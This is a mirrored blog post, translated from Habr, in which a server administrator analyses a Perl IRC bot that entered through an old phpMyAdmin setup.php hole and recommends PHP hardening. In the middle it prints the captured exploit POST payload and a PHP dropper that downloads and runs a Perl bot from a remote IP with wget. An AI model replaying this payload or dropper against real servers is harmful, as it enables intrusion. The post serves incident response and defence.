<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Analysis of bot penetration through an exploit in older versions of phpmyadmin and recommendations for php hosting security settings</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I have several servers in administration, on which my projects are hosted mainly, but besides them, there were still quite a few left sites to be plac...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Analysis of bot penetration through an exploit in older versions of phpmyadmin and recommendations for php hosting security settings</h1><div class="post__text post__text-html js-mediator-article"> I have several servers in administration, on which my projects are hosted mainly, but besides them, there were still quite a few left sites to be placed - clients, acquaintances, acquaintances, acquaintances, etc.  During the administration there were various problems, so some monitoring (zabbix and self-written scripts) are set up. <br><br>  And yesterday, on one of the servers, the script checking the active connections sounded the alarm: the outgoing connection to an unknown host on port 433 is constantly hanging, for more than 9 hours at the time I was able to read mail on Monday morning;) <br><br>  In a quick scan, apart from this active connection, no more anomalies and left processes in the system were detected, a sharp increase in traffic on the interface was also not detected, but this did not reassure me, so I had to find out more. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      <b>According to the results of the analysis, I found out that a similar security hole can be found on most servers with basic PHP settings, so I decided to make a post on Habr√© to protect other owners of servers with hosting from similar cases, and also described ways to find sources of infection on the server.</b> <a name="habracut"></a><br><br>  The system is installed with Debian Lenny with the latest updates, even partially from backports squeeze, postfix + dovecot, apache2, lighttpd, mysql, php, perl work - almost a basic configuration in general. <br><br>  My self-written script that detected this connection does the following: once every 30 minutes it runs the command <code>lsof -nP -i :80,443,25 +c 15</code> (the list of active outgoing connections to ports 80,443,25), cuts out my postfix mail server and some of my processes are still there, and if someone else is holding the connection besides them, then immediately turn on the panic mode. <br><br>  According to the results of this script, I received the following information: <br> <code>perl 31621 www-data 4u IPv4 123556667 TCP [_ip]:59216-&gt;81.223.126.136:443 (ESTABLISHED)</code> <br> <br>  I immediately connected via ssh, made ps aux, which surprised me a lot: <br> <code>UID PID PPID C STIME TTY TIME CMD <br> www-data 31621 1 0 20:15 ? 00:00:00 /usr/sbin/apache2 -k start</code> <br>  Those.  ps I claimed that it was not a perl, but an apache. <br><br>  Therefore, I wanted to find out the exact time of the appearance of this process in the system, in order to search through the logs during this time, and the script has a 30-minute lag, during which it managed to write a lot of logs.  It turned out that finding out a specific start date is quite problematic, the ps aux command showed only the start date (last day, 12 Dec), in / proc / file creation dates and the rest detected by a cursory infa did not coincide with the message interval from the script, but after active googling I managed to find the magic team and find out the specific time of the launch of this process to the nearest second: <br> <code># ps -eo pid,lstart,cmd</code> <br>  in the second column displays the exact time of the process start, for my process 12/12/2010 23:59:40. <br><br>  Carefully reviewing the logs of each virtual host during this time up to minus 5 minutes from now I didn‚Äôt find anything abnormal!  I also built a process tree and saw that this process has no parents (a parent with pid 0).  And there were no connections with IP where the connection hangs (81.223.126.136) in the logs of a single demon. <br><br>  Next, googling for perl, I found out that it is quite simple to change the command parameter to any other text, this is done through the $ 0 variable, i.e.  a running perl process can be displayed as mysqld, init, or any other daemon. <br><br>  So, we have an active perl process without a parent, which has been hanging for more than 9 hours and it is unknown where it started from, although on the hosting I only have PHP everywhere.  Therefore, even restarting apache leaves this process hanging active. <br><br>  Next, I tried to analyze traffic through tcpdump: <br> <code>000033 IP [my_ip].55026 &gt; 81.223.126.136.443: . ack 1 win 46 &lt;nop,nop,timestamp 575834701 2876573490&gt; <br> 000172 IP [my_ip].55026 &gt; 81.223.126.136.443: P 1:13(12) ack 1 win 46 &lt;nop,nop,timestamp 575834701 2876573490&gt; <br> 001043 IP 81.223.126.136.443 &gt; [my_ip].54320: . ack 163 win 54 &lt;nop,nop,timestamp 2876573490 575834655&gt; <br> 183151 IP 81.223.126.136.443 &gt; [my_ip].55026: . ack 13 win 46 &lt;nop,nop,timestamp 2876573536 575834701&gt; <br> 000022 IP [my_ip].55026 &gt; 81.223.126.136.443: P 13:145(132) ack 1 win 46 &lt;nop,nop,timestamp 575834747 2876573536&gt; <br> 000005 IP 81.223.126.136.443 &gt; [my_ip].55026: P 1:77(76) ack 13 win 46 &lt;nop,nop,timestamp 2876573536 575834701&gt; <br> 000006 IP [my_ip].55026 &gt; 81.223.126.136.443: . ack 77 win 46 &lt;nop,nop,timestamp 575834747 2876573536&gt; <br> 001213 IP 81.223.126.136.47092 &gt; [my_ip].113: S 4059834353:4059834353(0) win 5840 &lt;mss 1460,sackOK,timestamp 2876573536 0,nop,wscale 7&gt; <br> 000019 IP [my_ip].113 &gt; 81.223.126.136.47092: S 2188075368:2188075368(0) ack 4059834354 win 5792 &lt;mss 1460,sackOK,timestamp 575834748 2876573536,nop,wscale 7&gt;</code> <br> <br>  And I also found in the htop command the ability to do strace: <br> <code>select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 1 (in [4], left {0, 559974}) <br> read(4, "ERROR :Closing Link: Fasso'[sea.q"..., 4096) = 76 <br> select(8, [4], NULL, NULL, {0, 600000}) = 1 (in [4], left {0, 599998}) <br> read(4, ""..., 4096) = 0 <br> close(4) = 0 <br> socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 4 <br> ioctl(4, SNDCTL_TMR_TIMEBASE or TCGETS, 0x7fff99d8c7a0) = -1 EINVAL (Invalid argument) <br> lseek(4, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek) <br> ioctl(4, SNDCTL_TMR_TIMEBASE or TCGETS, 0x7fff99d8c7a0) = -1 EINVAL (Invalid argument) <br> lseek(4, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek) <br> fcntl(4, F_SETFD, FD_CLOEXEC) = 0 <br> connect(4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("81.223.126.136")}, 16) = 0 <br> getsockname(4, {sa_family=AF_INET, sin_port=htons(54087), sin_addr=inet_addr("[my_ip]")}, [149023476701724688]) = 0 <br> write(4, "NICK Fasso'\n"..., 12) = 12 <br> getsockname(4, {sa_family=AF_INET, sin_port=htons(54087), sin_addr=inet_addr("[my_ip]")}, [149023476701724688]) = 0 <br> write(4, "USER fake [my_ip] 81.223.1"..., 132) = 132 <br> rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0 <br> rt_sigaction(SIGCHLD, NULL, {SIG_IGN}, 8) = 0 <br> nanosleep({2, 0}, {2, 0}) = 0 <br> rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <br> select(8, [4], NULL, NULL, {0, 600000}) = 1 (in [4], left {0, 599997}) <br> read(4, "NOTICE AUTH :*** Looking up your "..., 4096) = 113 <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 1 (in [4], left {0, 198392}) <br> read(4, "NOTICE AUTH :*** Couldn't look up"..., 4096) = 66 <br> write(4, "PONG :258562266\n"..., 16) = 16 <br> select(8, [4], NULL, NULL, {0, 600000}) = 1 (in [4], left {0, 413936}) <br> read(4, ":god.undernet.hk 432 * Fasso' :Er"..., 4096) = 50 <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> 15:59:55 icq.j-im.ru <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout) <br> select(8, [4], NULL, NULL, {0, 600000}) = 1 (in [4], left {0, 198392}) <br> read(4, "NOTICE AUTH :*** Couldn't look up"..., 4096) = 66 <br> write(4, "PONG :258562266\n"..., 16) = 16 <br> select(8, [4], NULL, NULL, {0, 600000}) = 1 (in [4], left {0, 413936}) <br> read(4, ":god.undernet.hk 432 * Fasso' :Er"..., 4096) = 50 <br> select(8, [4], NULL, NULL, {0, 600000}) = 0 (Timeout)</code> <br> <br>  From this data I found out that this bot periodically exchanges information with the server (about once every 30-60 seconds), i.e.  it is actively working, but it does not generate a lot of traffic, I saw the host god.undernet.hk, but it didn‚Äôt help me in finding the source of this bot. <br><br>  Then, still thinking about brains, I made lsof -p 31621 and got the following conclusion: <br> <code>COMMAND PID USER FD TYPE DEVICE SIZE NODE NAME <br> perl 31621 www-data cwd DIR 9,4 640 2 /tmp <br> perl 31621 www-data rtd DIR 9,1 4096 2 / <br> perl 31621 www-data txt REG 9,1 6848 245277 /usr/bin/perl <br> perl 31621 www-data mem REG 9,1 25536 310438 /usr/lib/perl/5.10.0/auto/Socket/Socket.so <br> perl 31621 www-data mem REG 9,1 19704 310433 /usr/lib/perl/5.10.0/auto/IO/IO.so <br> perl 31621 www-data mem REG 9,1 39112 1404408 /lib/libcrypt-2.7.so <br> perl 31621 www-data mem REG 9,1 1375536 262722 /lib/libc-2.7.so <br> perl 31621 www-data mem REG 9,1 130114 261372 /lib/libpthread-2.7.so <br> perl 31621 www-data mem REG 9,1 534736 1404410 /lib/libm-2.7.so <br> perl 31621 www-data mem REG 9,1 14616 1404409 /lib/libdl-2.7.so <br> perl 31621 www-data mem REG 9,1 1499352 246277 /usr/lib/libperl.so.5.10.0 <br> perl 31621 www-data mem REG 9,1 119288 262716 /lib/ld-2.7.so <br> perl 31621 www-data 0u unix 0xffff880080459200 122918994 /tmp/php.socket-1 <br> perl 31621 www-data 1w FIFO 0,8 123556620 pipe <br> perl 31621 www-data 2w REG 9,1 838 979223 /var/log/lighttpd/error.log <br> perl 31621 www-data 3u unix 0xffff880020d31500 123039634 /tmp/php.socket-1 <br> perl 31621 www-data 4u IPv4 123556667 TCP [_ip]:59216-&gt;136-126-223-81.static.edis.at:https (ESTABLISHED)</code> <br> <br>  This conclusion surprised me even more by the presence of the word lighttpd (I have 2 ip on the server, apache hangs on one, lighttpd hangs on another), although in ps the process seemed to be apache, and it was apparently launched from / tmp. <br><br>  After further brainwashing, I decided to make a memory dump of this process, but reading / proc // mem did not help.  But the gcore command helped (from the gdb package) - with its help I was able to dump the process of this process into 3.2MB and began to view it manually.  When viewing it was possible to notice the following text fragments: <br> <code>@fakeps <br> /usr/sbin/apache2 -k start <br> god.txt <br> HTTP_HOST=[my_ip]..!.......DOCUMENT_ROOT=/var/www/.A.......SCRIPT_FILENAME=/var/www/phpmyadmin3/scripts/setup.php..A.......SCRIPT_NAME=/phpmyadmin3/scripts/setup.php..............!.......PHP_FC <br> GI_CHILDREN=16....1.......PATH=/sbin:/bin:/usr/sbin:/usr/bin......!.......PWD=/tmp................1.......REMOTE_ADDR=62.193.226.196..............!.......SHLVL=1.................1.......PHP_FCGI_MAX_REQUESTS=10000.............1.......OLDPWD=/ <br> var/www/phpmyadmin3.............!......._=/usr/bin/perl <br></code> <br>  <b>Wow, got caught!</b>  Pearl was launched from a PHP script /var/www/phpmyadmin3/scripts/setup.php <br>  We go to Google, type ‚Äúphpmyadmin setup.php exploit‚Äù and find a working exploit: <a href="http://www.securityfocus.com/bid/34236">www.securityfocus.com/bid/34236</a> - it was discovered 2009-03-24, also available on phpmyadmin: <a href="http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php">www.phpmyadmin.net/ home_page / security / PMASA-2009-3.php</a> and fixed only in versions <b>2.11.9.5</b> and <b>3.1.3.1</b> . <br><br>  This phpmyadmin was manually installed by me for a long time, because  there were no 3 versions in the repository, version 3.0.0-rc2 was installed, i.e.  old, still with a hole that was not rolled up, and then I safely forgot about it and it remained a dead weight to this day. <br><br>  Then, already knowing the address of the php script, we managed to find the hits in the lighttpd logs: <br> <code>62.193.226.196 [my_ip] - [12/Dec/2010:15:54:57 +0300] "GET /phpmyadmin3/scripts/setup.php HTTP/1.1" 200 14083 "http://[my_ip]/phpmyadmin3/scripts/setup.php" "Opera" <br> 62.193.226.196 [my_ip] - [12/Dec/2010:15:54:59 +0300] "POST /phpmyadmin3/scripts/setup.php HTTP/1.1" 200 556203 "http://[my_ip]/phpmyadmin3/scripts/setup.php" "Opera"</code> <br>  The only thing I do not understand is that this is the time difference, the request was at 15:54, and the process appeared at 23:59. <br><br>  I still wanted to know what kind of bot that I slipped, so instead of blocking access to the script, we prescribe a trap there: <br><pre> <code class="php hljs">$loginfo[<span class="hljs-string"><span class="hljs-string">'date'</span></span>]=date(<span class="hljs-string"><span class="hljs-string">'c'</span></span>); $loginfo[<span class="hljs-string"><span class="hljs-string">'env'</span></span>]=var_export($_ENV,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $loginfo[<span class="hljs-string"><span class="hljs-string">'get'</span></span>]=var_export($_GET,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $loginfo[<span class="hljs-string"><span class="hljs-string">'post'</span></span>]=var_export($_POST,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); file_put_contents(<span class="hljs-string"><span class="hljs-string">'log.txt'</span></span>,var_export($loginfo,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>),FILE_APPEND);</code> </pre> <br>  The trap was not long in coming, at 22 o'clock the next day it catches the call to this script again, and we already have the exploit code: <br><pre> <code class="php hljs"> <span class="hljs-string"><span class="hljs-string">'post'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'array ( \'action\' =&gt; \'lay_navigation\', \'eoltype\' =&gt; \'unix\', \'token\' =&gt; \'4b179cfc2f788d828bf9ff8d2f122459\', \'configuration\' =&gt; \'a:1:{i:0;O:10:\\\\"PMA_Config\\\\":1:{s:6:\\\\"source\\\\";s:44:\\\\" ftp://web1:l33t@85.25.132.71/html/godbot.txt\\\\";}}\', )'</span></span></code> </pre> <br>  Download this file via wget and see: <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> system(<span class="hljs-string"><span class="hljs-string">"cd /tmp;killall -9 perl;wget -O god.txt 67.19.118.242/god.txt;perl god.txt;rm -f god.txt*"</span></span>);<span class="hljs-keyword"><span class="hljs-keyword">die</span></span>;</code> </pre> <br>  Next, the link already gets the bot code itself (34 KB), who are interested can download it and see. <br><br>  <b>So, I managed to find out the source of the penetration of this bot and get the code of the bot itself.</b>  It remains to patch the hole;) <br><br>  <i>I hope the description of my analysis will help other admins in the search and analysis of all kinds of evil on their servers.</i> <br><br><h4>  How to protect against such cases </h4><br>  The very first thing that comes to mind is that it is necessary to be updated in time to the latest versions.  Yes, in this particular case, I myself am guilty for not following the phpmyadmin version, but every hosting client cannot be made to constantly update their phpmyadmin, which they very often upload on the site, so you need to take into account that the presence of old leaky versions of the scripts is inevitable, so everyone a user with access to his home folder is already a source of similar problems, since  it is useless to fight for the purity and security of the code on each site, you need to take global protection measures. <br><br>  <b>It turns out that each server with the basic php settings is potentially subject to such a threat, and it‚Äôs almost impossible to notice that such a bot has settled on the server.</b>  <b>Therefore, I recommend that administrators protect the server from similar problems in advance and configure monitoring of anomalous activity.</b> <br><br><h4>  I have taken the following protection measures: </h4><br>  1. Set up periodic monitoring of active connections, with the help of this you can immediately notice the abnormal activity, whether it be spamming with a php script or a bot connection to the server.  Immediately, the lsof command and the memory dump of this process were added to this script, since  by the time I get to the server, the script can already work and unload. <br><br>  2. Prevent php from running exec, system, etc., functions, because  they are required very rarely, so most of the clients are not used.  The ideal option would be to log using these functions, but I did not find how to do it <b><i>(by the way, can someone tell me how to do it?)</i></b> , The full line in php.ini is as follows: <br> <code>disable_functions = "ini_alter, curl_exec, exec, system, passthru, shell_exec, proc_open, proc_close, proc_get_status, proc_nice, proc_terminate, leak, listen, chgrp, apache_note, apache_setenv, closelog, debugger_off, debugger_on, define_sys <br> log_variables, openlog, syslog,ftp_exec,dl"</code> <br> <br>  <b>I would like to hear the comments of habrauers if I chose the right ways of protection and who does protection against similar cases on my servers.</b> <br><br>  I also had the following questions open: <br><ol><li>  How can you find out the real command to start the process and the path to it, if it is already overwritten by the process itself, without resorting to a memory dump and manual viewing of the cracks? </li><li>  How in linux can I intercept and view all traffic through tcpdump or a similar utility from a specific process, knowing its pid? </li><li>  Are there any ready-made solutions for monitoring non-standard server activity in connections? </li><li>  Is it possible to somehow configure in php the logging of exec functions and the like? </li></ol><br>  <b>UPD.:</b> By the way, this hole may not be closed in phpmyadmin from repositories, you need to carefully watch the docks.  The patch was patched only in versions <b>2.11.9.5</b> and <b>3.1.3.1</b> .  But for example in Debian Lenny goes 4: 2.11.8.1-5 + lenny6, and the hole is closed by a separate patch -http: //www.debian.org/security/2009/dsa-1824 <br>  More information about this hole: <a href="http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php">www.phpmyadmin.net/home_page/security/PMASA-2009-3.php</a> <br><br>  <b>UPD2:</b> Is it possible to somehow configure through the firewall (as far as I understand for linux it will be iptables) restricting access to specific processes to the network?  For example, prevent all perl processes from connecting outside.  In Android OS (it also works on the Linux kernel), there is a DroidWall program that allows you to enable / disable network access to specific applications, but I didn‚Äôt understand something in the basic Linux distribution (for example, Debian) whether this could be done. <br><br>  <b>UPD3:</b> By comments and letters I added the list of functions and threw out some unnecessary ones: <br> <code>disable_functions = "apache_setenv, chown, chgrp, closelog, define_syslog_variables, dl, exec, ftp_exec, openlog, passthru, pcntl_exec, popen, posix_getegid, posix_geteuid, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid, posix_uname, proc_close, proc_get_status, proc_nice, proc_open, proc_open, proc_terminate, shell_exec, syslog, system"</code> <br> <br>  <b>UPD4:</b> More additions at the request of the audience: <br>  <b>Script for checking active connections:</b> <i>(it was written quickly on my knee only for my personal needs)</i> <br><pre> <code class="bash hljs"><span class="hljs-variable"><span class="hljs-variable">$out</span></span>=system(<span class="hljs-string"><span class="hljs-string">"lsof -nP -i :80,443,25 +c 15 | grep -v -E '^(COMMAND|apache2|zabbix|smtpd?|master|scache|host|lighttpd)' | grep -v 'wget.*&gt;[my_ip]:80'"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strlen(<span class="hljs-variable"><span class="hljs-variable">$out</span></span>)) { <span class="hljs-variable"><span class="hljs-variable">$arr</span></span>=explode(<span class="hljs-string"><span class="hljs-string">"\n"</span></span>,<span class="hljs-variable"><span class="hljs-variable">$out</span></span>); foreach(<span class="hljs-variable"><span class="hljs-variable">$arr</span></span> as <span class="hljs-variable"><span class="hljs-variable">$str</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-variable"><span class="hljs-variable">$str</span></span>.<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-variable"><span class="hljs-variable">$spl</span></span>=preg_split(<span class="hljs-string"><span class="hljs-string">"/\s+/"</span></span>,<span class="hljs-variable"><span class="hljs-variable">$str</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> `ps -f -p {<span class="hljs-variable"><span class="hljs-variable">$spl</span></span>[1]}`.<span class="hljs-string"><span class="hljs-string">"\n\n"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> `lsof -p {<span class="hljs-variable"><span class="hljs-variable">$spl</span></span>[1]}`.<span class="hljs-string"><span class="hljs-string">"\n\n"</span></span>; }</code> </pre><br>  And prescribe it in cron for every 30 minutes.  If something extra displays it at startup, then add grep to the list so that it does not interfere.  As a result, if something left appears, which tries to either spam or download something, then immediately cron notifies me by mail. <br><br>  <b>UPD4:</b> from user <a href="https://habrahabr.ru/users/z123/" class="user_link">z123</a> : how to find out the real program that launched the process (if it was changed): <br>  ps -p 123 -o comm <br>  readlink / proc / 123 / exe (123 replaced by process number) <br>  But, unfortunately, they do not show the startup parameters and the folder, but output only perl and / usr / bin / perl for this bot, so without a memory dump I have not yet found a way to find the folder where the infection got from (ie, find the <code>/var/www/phpmyadmin3/scripts/setup.php</code> line <code>/var/www/phpmyadmin3/scripts/setup.php</code> ) </div><p>Source: <a href="https://habr.com/ru/post/109974/">https://habr.com/ru/post/109974/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../109968/index.html">Intellectual property infringement is rape</a></li>
<li><a href="../109969/index.html">Hi-Fi in the digital age. Part 2</a></li>
<li><a href="../109970/index.html">The story of one repository</a></li>
<li><a href="../109971/index.html">Java 7 for Mac OS X: The Future Behind OpenJDK</a></li>
<li><a href="../109972/index.html">‚ÄúThe Internet is an effective and economical channel for attracting customers‚Äù - a blow to the very liver</a></li>
<li><a href="../109975/index.html">HTML paragraphs in the texts of topics on the desktop and in the editor</a></li>
<li><a href="../109976/index.html">OpenWRT + Asus WL 520GU + Iptables. We separate LAN, DMZ and Internet</a></li>
<li><a href="../109978/index.html">Windows Phone 7 Rocks!</a></li>
<li><a href="../109979/index.html">Evernote update for Android - even more features.</a></li>
<li><a href="../109981/index.html">Facebook Friendship</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>